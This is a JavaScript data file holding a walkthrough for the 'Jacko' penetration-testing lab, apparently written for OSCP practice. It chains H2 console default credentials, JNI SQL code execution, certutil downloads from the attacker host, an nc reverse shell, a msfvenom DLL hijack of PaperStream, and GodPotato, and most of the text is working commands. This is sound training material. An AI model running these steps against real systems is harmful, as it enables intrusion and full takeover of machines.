/* Step-by-step walkthroughs for labs, shown on the lab page.
   Built by build_guides.py. {K} is your Kali IP and {T} the target IP. */
window.OSCP_GUIDES = {
 "pgp-jacko": {
  "title": "Windows · H2 database → PaperStream privesc",
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.66"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 5000 -Pn {T} -oN jacko_ports.txt\nsudo nmap -sC -sV -p 80,135,139,445,5040,8082,9092 -Pn {T} -oN jacko_svc.txt"
     },
     {
      "t": "out",
      "v": "80/tcp   open  http     Microsoft IIS 10.0  |_http-title: H2 Database Engine (redirect)\n445/tcp  open  microsoft-ds?\n8082/tcp open  http     H2 database http console\n9092/tcp open  XmlIpcRegSvc?"
     },
     {
      "t": "p",
      "v": "🎯 The lead is the **H2 web console on port 8082**."
     }
    ]
   },
   {
    "h": "Get into the H2 console",
    "b": [
     {
      "t": "p",
      "v": "Browse to `http://{T}:8082` and log in with:"
     },
     {
      "t": "list",
      "v": [
       "JDBC URL: `jdbc:h2:~/test`",
       "User: `sa`",
       "Password: blank ✅ (the default works)"
      ]
     },
     {
      "t": "p",
      "v": "The footer shows **H2 1.4.199**, which is vulnerable to JNI code execution (**EDB-49384**)."
     }
    ]
   },
   {
    "h": "RCE through SQL (EDB-49384)",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit h2 1.4.199\nsearchsploit -m 49384"
     },
     {
      "t": "p",
      "v": "Paste the queries from `49384.txt` into the console in this order:"
     },
     {
      "t": "list",
      "v": [
       "`SELECT CSVWRITE('C:\\Windows\\Temp\\JNIScriptEngine.dll', ...)`: the long hex blob from the file, which drops the DLL.",
       "Load it, create the eval alias and test it:"
      ]
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "CREATE ALIAS IF NOT EXISTS System_load FOR \"java.lang.System.load\";\nCALL System_load('C:\\Windows\\Temp\\JNIScriptEngine.dll');\nCREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR \"JNIScriptEngine.eval\";\nCALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\Z\").next()');"
     },
     {
      "t": "out",
      "v": "jacko\\tony"
     },
     {
      "t": "p",
      "v": "🎉 Code execution as **tony**."
     }
    ]
   },
   {
    "h": "Reverse shell",
    "b": [
     {
      "t": "p",
      "v": "On Kali, serve nc.exe and start a listener:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cp /usr/share/windows-resources/binaries/nc.exe .\npython3 -m http.server 80"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 8082"
     },
     {
      "t": "p",
      "v": "Run these through H2, one at a time (they replace the `exec(\"...\")` part):"
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"certutil -urlcache -split -f http://{K}/nc.exe C:/Users/tony/nc.exe\").getInputStream()).useDelimiter(\"\\\\Z\").next()');"
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"C:/Users/tony/nc.exe {K} 8082 -e cmd.exe\").getInputStream()).useDelimiter(\"\\\\Z\").next()');"
     },
     {
      "t": "warn",
      "v": "Call back on **port 8082**. Egress is filtered, so use a port the box already uses."
     }
    ]
   },
   {
    "h": "Fix the broken PATH (Jacko-specific)",
    "b": [
     {
      "t": "p",
      "v": "`whoami` says \"not recognized\" until you run this:"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "set PATH=%PATH%;C:\\Windows\\System32;C:\\Windows\\System32\\WindowsPowerShell\\v1.0;\nwhoami\ntype C:\\Users\\tony\\Desktop\\local.txt"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Privesc enumeration",
    "b": [
     {
      "t": "code",
      "lang": "cmd",
      "v": "whoami /priv\ndir \"C:\\Program Files (x86)\"\ntype \"C:\\Program Files (x86)\\PaperStream IP\\TWAIN\\readmeenu.rtf\""
     },
     {
      "t": "p",
      "v": "Found **PaperStream IP (TWAIN) 1.42**, which is vulnerable to **EDB-49382**: a DLL hijack through the FJTWSVIC service, which runs as SYSTEM."
     }
    ]
   },
   {
    "h": "SYSTEM via PaperStream (EDB-49382)",
    "b": [
     {
      "t": "p",
      "v": "On Kali:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit -m 49382\nmv 49382.ps1 exploit.ps1\nmsfvenom -p windows/shell_reverse_tcp LHOST={K} LPORT=8082 -f dll -o UninOldIS.dll\npython3 -m http.server 80"
     },
     {
      "t": "p",
      "v": "In `exploit.ps1`, set `$PayloadFile = \"C:\\Windows\\Temp\\UninOldIS.dll\"`."
     },
     {
      "t": "p",
      "v": "Start a new listener (kill the old one, or use another tab):"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 8082"
     },
     {
      "t": "p",
      "v": "On the target:"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "cd C:\\Windows\\Temp\ncertutil -urlcache -split -f http://{K}/UninOldIS.dll UninOldIS.dll\ncertutil -urlcache -split -f http://{K}/exploit.ps1 exploit.ps1\npowershell -ep bypass C:\\Windows\\Temp\\exploit.ps1"
     },
     {
      "t": "out",
      "v": "nt authority\\system"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "type C:\\Users\\Administrator\\Desktop\\proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "backup": {
   "h": "Backup route: GodPotato",
   "b": [
    {
     "t": "p",
     "v": "If `whoami /priv` shows **SeImpersonatePrivilege** enabled:"
    },
    {
     "t": "code",
     "lang": "cmd",
     "v": "certutil -urlcache -split -f http://{K}/GodPotato-NET4.exe C:\\Windows\\Temp\\gp.exe\nC:\\Windows\\Temp\\gp.exe -cmd \"C:\\Users\\tony\\nc.exe {K} 8082 -e cmd.exe\""
    }
   ]
  },
  "takeaways": [
   "🔑 Try **default creds** on every web console (`sa` with a blank password).",
   "🌐 A reverse shell that dies means **egress is filtered**: reuse an open port like 8082 or 80.",
   "🛠️ A shell where nothing works usually means a **broken PATH**: set it by hand.",
   "📂 Always check `Program Files (x86)` for third-party software, then `searchsploit` its version."
  ]
 }
};
